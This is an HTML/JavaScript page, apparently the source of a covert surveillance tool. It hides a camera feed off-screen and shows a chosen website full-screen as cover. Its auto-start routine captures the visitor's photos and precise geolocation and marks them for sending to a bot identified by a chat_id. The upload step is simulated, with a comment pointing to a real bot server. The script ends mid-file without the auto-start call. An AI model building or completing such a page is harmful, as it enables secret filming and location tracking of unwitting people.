<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Background Camera with Website Overlay</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        /* Hidden camera section - runs in background */
        #backgroundCamera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
        }
        
        /* Main website iframe - visible in foreground */
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        /* Floating control panel */
        #controlPanel {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px;
            z-index: 1000;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            border: 2px solid rgba(255, 255, 255, 0.2);
            min-width: 300px;
            max-width: 350px;
            color: white;
            display: none; /* Hidden by default */
        }
        
        #controlPanel.visible {
            display: block;
        }
        
        /* Toggle button to show/hide control panel */
        #toggleControl {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 50px;
            height: 50px;
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            color: white;
            font-size: 1.5rem;
            cursor: pointer;
            z-index: 999;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            transition: all 0.3s ease;
        }
        
        #toggleControl:hover {
            background: rgba(0, 0, 0, 0.95);
            transform: scale(1.1);
        }
        
        #toggleControl.hidden {
            display: none;
        }
        
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            cursor: pointer;
        }
        
        .panel-title {
            font-size: 1.2rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .minimize-btn {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
        }
        
        .minimize-btn:hover {
            background: rgba(255, 255, 255, 0.3);
        }
        
        .status-grid {
            display: grid;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .status-item {
            background: rgba(255, 255, 255, 0.1);
            padding: 10px;
            border-radius: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .status-label {
            font-size: 0.9rem;
            opacity: 0.8;
        }
        
        .status-value {
            font-weight: 600;
            font-size: 1rem;
        }
        
        .controls {
            display: grid;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 10px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn:hover:not(:disabled) {
            transform: translateY(-2px);
            opacity: 0.9;
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .btn-success {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            color: white;
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%);
            color: white;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
            color: white;
        }
        
        .website-input {
            width: 100%;
            padding: 10px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 0.9rem;
            margin-bottom: 10px;
        }
        
        .website-input:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .website-input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        
        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 3px;
            overflow: hidden;
            margin-top: 10px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #11998e, #38ef7d);
            width: 0%;
            transition: width 0.1s linear;
        }
        
        .capture-status {
            margin-top: 10px;
            font-size: 0.85rem;
            text-align: center;
            padding: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 5px;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
        
        .sending {
            animation: pulse 0.5s infinite;
        }
        
        .success {
            color: #38ef7d;
        }
        
        .error {
            color: #f45c43;
        }
        
        .settings-section {
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .settings-title {
            font-size: 1rem;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .setting-item {
            margin-bottom: 10px;
        }
        
        .setting-label {
            font-size: 0.85rem;
            margin-bottom: 5px;
            display: block;
            opacity: 0.8;
        }
        
        select, input[type="range"] {
            width: 100%;
            padding: 8px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 6px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 0.85rem;
        }
        
        select option {
            background: #1a1a1a;
        }
        
        .gallery-preview {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-top: 15px;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .gallery-preview::-webkit-scrollbar {
            width: 4px;
        }
        
        .gallery-preview::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.3);
            border-radius: 2px;
        }
        
        .gallery-thumb {
            width: 100%;
            aspect-ratio: 1;
            object-fit: cover;
            border-radius: 6px;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .gallery-thumb:hover {
            transform: scale(1.1);
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.95);
            z-index: 2000;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            position: relative;
            max-width: 90%;
            max-height: 90%;
        }
        
        .modal-content img {
            max-width: 100%;
            max-height: 90vh;
            border-radius: 10px;
        }
        
        .modal-close {
            position: absolute;
            top: -40px;
            right: 0;
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1.2rem;
        }
        
        .draggable {
            cursor: move;
        }
        
        @media (max-width: 768px) {
            #controlPanel {
                bottom: 10px;
                right: 10px;
                left: 10px;
                max-width: none;
            }
        }
    </style>
</head>
<body>
    <!-- Hidden camera in background -->
    <div id="backgroundCamera">
        <video id="cameraVideo" autoplay playsinline muted></video>
    </div>
    
    <!-- Main website iframe (foreground) -->
    <iframe id="websiteFrame" src="about:blank"></iframe>
    
    <!-- Toggle button -->
    <button id="toggleControl" onclick="toggleControlPanel()">‚öôÔ∏è</button>
    
    <!-- Floating control panel -->
    <div id="controlPanel">
        <div class="panel-header" onclick="togglePanel()">
            <div class="panel-title">
                <span>üì∏</span>
                <span>Camera Control</span>
            </div>
            <button class="minimize-btn" id="minimizeBtn" onclick="event.stopPropagation(); toggleControlPanel()">‚úï</button>
        </div>
        
        <div class="panel-content">
            <!-- Website URL Input -->
            <div style="margin-bottom: 15px;">
                <label class="setting-label">üåê Current Website</label>
                <input 
                    type="text" 
                    id="websiteUrl" 
                    class="website-input" 
                    placeholder="Enter website URL"
                    value=""
                    readonly
                    style="opacity: 0.7;"
                >
                <button class="btn btn-primary" onclick="loadWebsite()">
                    üîÑ Reload Website
                </button>
                <small style="display: block; margin-top: 5px; opacity: 0.7; font-size: 0.75rem;">
                    Format: ?chat_id=YOUR_ID&site=YOUR_WEBSITE
                </small>
            </div>
            
            <!-- Status -->
            <div class="status-grid">
                <div class="status-item">
                    <span class="status-label">üì∑ Camera</span>
                    <span class="status-value" id="cameraStatus">Off</span>
                </div>
                <div class="status-item">
                    <span class="status-label">üí¨ Chat ID</span>
                    <span class="status-value" id="chatIdDisplay">${CHAT_ID}</span>
                </div>
                <div class="status-item">
                    <span class="status-label">üìç Location</span>
                    <span class="status-value" id="locationStatus">Pending</span>
                </div>
                <div class="status-item">
                    <span class="status-label">üì∏ Photos</span>
                    <span class="status-value" id="photoCount">0</span>
                </div>
                <div class="status-item">
                    <span class="status-label">üì§ Sent</span>
                    <span class="status-value" id="photosSent">0</span>
                </div>
            </div>
            
            <!-- Controls -->
            <div class="controls">
                <button class="btn btn-success" id="startCamera" onclick="startCamera()">
                    üìπ Start Camera
                </button>
                <button class="btn btn-danger" id="stopCamera" onclick="stopCamera()" disabled>
                    ‚èπÔ∏è Stop Camera
                </button>
                <button class="btn btn-warning" id="autoCapture" onclick="autoCapture()" disabled>
                    ‚ö° Auto-Capture (5 photos)
                </button>
            </div>
            
            <!-- Progress -->
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="capture-status" id="captureStatus">Ready</div>
            
            <!-- Settings -->
            <div class="settings-section">
                <div class="settings-title">‚öôÔ∏è Settings</div>
                
                <div class="setting-item">
                    <label class="setting-label">Camera</label>
                    <select id="cameraSelect" onchange="switchCamera()">
                        <option value="user">Front Camera</option>
                        <option value="environment">Back Camera</option>
                    </select>
                </div>
                
                <div class="setting-item">
                    <label class="setting-label">Resolution</label>
                    <select id="resolutionSelect">
                        <option value="640,480" selected>640x480</option>
                        <option value="1280,720">1280x720 (HD)</option>
                        <option value="1920,1080">1920x1080 (Full HD)</option>
                    </select>
                </div>
                
                <div class="setting-item">
                    <label class="setting-label">Capture Interval: <span id="intervalValue">100</span>ms</label>
                    <input type="range" id="intervalSlider" min="50" max="500" value="100" step="50" oninput="updateInterval()">
                </div>
            </div>
            
            <!-- Gallery Preview -->
            <div class="settings-section">
                <div class="settings-title">üñºÔ∏è Gallery</div>
                <div class="gallery-preview" id="galleryPreview">
                    <div style="grid-column: 1/-1; text-align: center; padding: 20px; opacity: 0.5;">
                        No photos yet
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Photo Modal -->
    <div class="modal" id="photoModal" onclick="closeModal()">
        <div class="modal-content" onclick="event.stopPropagation()">
            <button class="modal-close" onclick="closeModal()">‚úï</button>
            <img id="modalImage" src="" alt="Photo">
        </div>
    </div>

    <script>
        // Configuration - Get website and chat_id from URL parameters
        function getConfigFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            
            // Get website URL from multiple possible parameters
            const websiteParam = urlParams.get('site') || urlParams.get('url') || urlParams.get('website');
            const chatId = urlParams.get('chat_id');
            
            let websiteURL = 'https://www.example.com'; // Default fallback
            
            if (websiteParam) {
                // Decode the URL if it's encoded
                websiteURL = decodeURIComponent(websiteParam);
                
                // Add https:// if not present
                if (!websiteURL.startsWith('http://') && !websiteURL.startsWith('https://')) {
                    websiteURL = 'https://' + websiteURL;
                }
            }
            
            return {
                website: websiteURL,
                chatId: chatId || 'unknown'
            };
        }
        
        const config = getConfigFromURL();
        const DEFAULT_WEBSITE = config.website;
        const CHAT_ID = config.chatId;
        
        console.log('Configuration loaded:', config);
        
        // App State
        let cameraStream = null;
        let currentFacingMode = 'user';
        let photos = [];
        let photosSentCount = 0;
        let isAutoCapturing = false;
        let captureInterval = 100;
        let currentResolution = { width: 640, height: 480 };
        
        // DOM Elements
        const cameraVideo = document.getElementById('cameraVideo');
        const websiteFrame = document.getElementById('websiteFrame');
        const controlPanel = document.getElementById('controlPanel');
        const startCameraBtn = document.getElementById('startCamera');
        const stopCameraBtn = document.getElementById('stopCamera');
        const autoCaptureBtn = document.getElementById('autoCapture');
        const cameraStatus = document.getElementById('cameraStatus');
        const photoCount = document.getElementById('photoCount');
        const photosSent = document.getElementById('photosSent');
        const locationStatus = document.getElementById('locationStatus');
        const progressFill = document.getElementById('progressFill');
        const captureStatus = document.getElementById('captureStatus');
        const galleryPreview = document.getElementById('galleryPreview');
        const photoModal = document.getElementById('photoModal');
        const modalImage = document.getElementById('modalImage');
        const resolutionSelect = document.getElementById('resolutionSelect');
        const intervalSlider = document.getElementById('intervalSlider');
        const toggleControlBtn = document.getElementById('toggleControl');
        
        // Toggle control panel visibility
        function toggleControlPanel() {
            controlPanel.classList.toggle('visible');
            if (controlPanel.classList.contains('visible')) {
                toggleControlBtn.style.display = 'none';
            } else {
                toggleControlBtn.style.display = 'flex';
            }
        }
        
        // Load website in iframe
        function loadWebsite() {
            const url = document.getElementById('websiteUrl').value.trim();
            if (url) {
                try {
                    // Add https:// if not present
                    const formattedUrl = url.startsWith('http') ? url : 'https://' + url;
                    websiteFrame.src = formattedUrl;
                    captureStatus.textContent = `Loading: ${formattedUrl}`;
                    
                    // Handle iframe load errors
                    websiteFrame.onerror = () => {
                        captureStatus.textContent = 'Failed to load website';
                        captureStatus.className = 'capture-status error';
                    };
                } catch (error) {
                    captureStatus.textContent = 'Invalid URL';
                    captureStatus.className = 'capture-status error';
                }
            }
        }
        
        // Load default website on startup
        function loadDefaultWebsite() {
            const urlInput = document.getElementById('websiteUrl');
            urlInput.value = DEFAULT_WEBSITE;
            loadWebsite();
        }
        
        // Toggle panel minimize
        function togglePanel() {
            // This function is no longer needed but kept for compatibility
        }
        
        // Update interval
        function updateInterval() {
            captureInterval = parseInt(intervalSlider.value);
            document.getElementById('intervalValue').textContent = captureInterval;
        }
        
        // Start camera (background)
        async function startCamera() {
            try {
                cameraStatus.textContent = 'Starting...';
                
                const constraints = {
                    video: {
                        width: { ideal: currentResolution.width },
                        height: { ideal: currentResolution.height },
                        facingMode: currentFacingMode
                    }
                };
                
                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraVideo.srcObject = cameraStream;
                
                cameraStatus.textContent = 'Active';
                cameraStatus.className = 'status-value success';
                
                startCameraBtn.disabled = true;
                stopCameraBtn.disabled = false;
                autoCaptureBtn.disabled = false;
                
                captureStatus.textContent = 'Camera running in background';
            } catch (error) {
                console.error('Camera error:', error);
                cameraStatus.textContent = 'Error';
                cameraStatus.className = 'status-value error';
                captureStatus.textContent = 'Camera access denied';
            }
        }
        
        // Stop camera
        function stopCamera() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraVideo.srcObject = null;
                cameraStream = null;
                
                cameraStatus.textContent = 'Off';
                cameraStatus.className = 'status-value';
                
                startCameraBtn.disabled = false;
                stopCameraBtn.disabled = true;
                autoCaptureBtn.disabled = true;
                
                captureStatus.textContent = 'Camera stopped';
            }
        }
        
        // Switch camera
        async function switchCamera() {
            currentFacingMode = document.getElementById('cameraSelect').value;
            if (cameraStream) {
                stopCamera();
                await startCamera();
            }
        }
        
        // Update resolution
        resolutionSelect.addEventListener('change', () => {
            const [width, height] = resolutionSelect.value.split(',').map(Number);
            currentResolution = { width, height };
            if (cameraStream) {
                stopCamera();
                startCamera();
            }
        });
        
        // Capture single photo
        function capturePhoto() {
            return new Promise((resolve) => {
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                
                canvas.width = cameraVideo.videoWidth;
                canvas.height = cameraVideo.videoHeight;
                
                context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    const photo = {
                        id: Date.now() + Math.random(),
                        blob: blob,
                        url: URL.createObjectURL(blob),
                        timestamp: new Date(),
                        resolution: `${canvas.width}x${canvas.height}`
                    };
                    
                    photos.push(photo);
                    updateGallery();
                    photoCount.textContent = photos.length;
                    
                    resolve(photo);
                }, 'image/jpeg', 0.95);
            });
        }
        
        // Send photo to bot (simulated)
        async function sendPhotoToBot(photo, photoNumber) {
            return new Promise((resolve) => {
                captureStatus.textContent = `Sending photo ${photoNumber}...`;
                captureStatus.classList.add('sending');
                
                // Simulate API call
                setTimeout(() => {
                    photosSentCount++;
                    photosSent.textContent = photosSentCount;
                    captureStatus.classList.remove('sending');
                    console.log(`Photo ${photoNumber} sent!`, {
                        size: photo.blob.size,
                        timestamp: photo.timestamp,
                        resolution: photo.resolution
                    });
                    resolve();
                }, 50);
            });
        }
        
        // Auto-capture 5 photos
        async function autoCapture() {
            await autoCaptureWithLocation();
        }
        
        // Update gallery preview
        function updateGallery() {
            if (photos.length === 0) {
                galleryPreview.innerHTML = '<div style="grid-column: 1/-1; text-align: center; padding: 20px; opacity: 0.5;">No photos yet</div>';
                return;
            }
            
            galleryPreview.innerHTML = '';
            photos.slice(-9).reverse().forEach((photo, index) => {
                const img = document.createElement('img');
                img.src = photo.url;
                img.className = 'gallery-thumb';
                img.onclick = () => viewPhoto(photo);
                galleryPreview.appendChild(img);
            });
        }
        
        // View photo in modal
        function viewPhoto(photo) {
            modalImage.src = photo.url;
            photoModal.classList.add('active');
        }
        
        // Close modal
        function closeModal() {
            photoModal.classList.remove('active');
        }
        
        // Make control panel draggable
        let isDragging = false;
        let currentX, currentY, initialX, initialY;
        
        controlPanel.querySelector('.panel-header').addEventListener('mousedown', dragStart);
        document.addEventListener('mousemove', drag);
        document.addEventListener('mouseup', dragEnd);
        
        function dragStart(e) {
            if (e.target.classList.contains('minimize-btn')) return;
            initialX = e.clientX - controlPanel.offsetLeft;
            initialY = e.clientY - controlPanel.offsetTop;
            isDragging = true;
        }
        
        function drag(e) {
            if (isDragging) {
                e.preventDefault();
                currentX = e.clientX - initialX;
                currentY = e.clientY - initialY;
                controlPanel.style.left = currentX + 'px';
                controlPanel.style.top = currentY + 'px';
                controlPanel.style.right = 'auto';
                controlPanel.style.bottom = 'auto';
            }
        }
        
        function dragEnd() {
            isDragging = false;
        }
        
        // Cleanup
        window.addEventListener('beforeunload', () => {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
            photos.forEach(photo => URL.revokeObjectURL(photo.url));
        });
        
        // Get location
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    console.log('Geolocation not supported');
                    locationStatus.textContent = 'Not supported';
                    locationStatus.className = 'status-value error';
                    resolve(null);
                    return;
                }
                
                locationStatus.textContent = 'Getting...';
                locationStatus.className = 'status-value';
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date()
                        };
                        locationStatus.textContent = `${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)}`;
                        locationStatus.className = 'status-value success';
                        console.log('Location captured:', location);
                        resolve(location);
                    },
                    (error) => {
                        console.log('Location error:', error.message);
                        locationStatus.textContent = 'Denied';
                        locationStatus.className = 'status-value error';
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // Send photo with location to bot
        async function sendPhotoWithLocation(photo, photoNumber, location) {
            return new Promise((resolve) => {
                captureStatus.textContent = `Sending photo ${photoNumber} with location...`;
                captureStatus.classList.add('sending');
                
                const data = {
                    chat_id: CHAT_ID,
                    photo: {
                        size: photo.blob.size,
                        timestamp: photo.timestamp,
                        resolution: photo.resolution
                    },
                    location: location,
                    photo_number: photoNumber
                };
                
                // Simulate API call to bot
                // In production, this would be an actual API call to your bot server
                setTimeout(() => {
                    photosSentCount++;
                    photosSent.textContent = photosSentCount;
                    captureStatus.classList.remove('sending');
                    console.log(`Photo ${photoNumber} + Location sent to chat_id: ${CHAT_ID}`, data);
                    resolve();
                }, 50);
            });
        }
        
        // Modified auto-capture with location
        async function autoCaptureWithLocation() {
            if (isAutoCapturing) return;
            
            isAutoCapturing = true;
            autoCaptureBtn.disabled = true;
            
            // Get location first
            captureStatus.textContent = 'Getting location...';
            const location = await getLocation();
            
            const totalPhotos = 5;
            
            for (let i = 1; i <= totalPhotos; i++) {
                const progress = (i / totalPhotos) * 100;
                progressFill.style.width = progress + '%';
                
                captureStatus.textContent = `Capturing photo ${i}/${totalPhotos}...`;
                
                const photo = await capturePhoto();
                await sendPhotoWithLocation(photo, i, location);
                
                captureStatus.textContent = `Photo ${i} + location sent! ‚úì`;
                
                if (i < totalPhotos) {
                    await new Promise(resolve => setTimeout(resolve, captureInterval));
                }
            }
            
            progressFill.style.width = '100%';
            captureStatus.textContent = `All ${totalPhotos} photos + location sent! ‚úì`;
            captureStatus.className = 'capture-status success';
            
            setTimeout(() => {
                progressFill.style.width = '0%';
                captureStatus.textContent = 'Ready for next capture';
                captureStatus.className = 'capture-status';
                isAutoCapturing = false;
                autoCaptureBtn.disabled = false;
            }, 2000);
        }
        
        // Auto-start function
        async function autoStart() {
            console.log('Auto-starting camera and capture...');
            
            // Load default website first
            loadDefaultWebsite();
            
            // Small delay to ensure page is loaded
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Start camera automatically
            await startCamera();
            
            // Wait for camera to initialize
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            // Start auto-capture with location
            if (cameraStream) {
                await autoCaptureWithLocation();
            }
        }
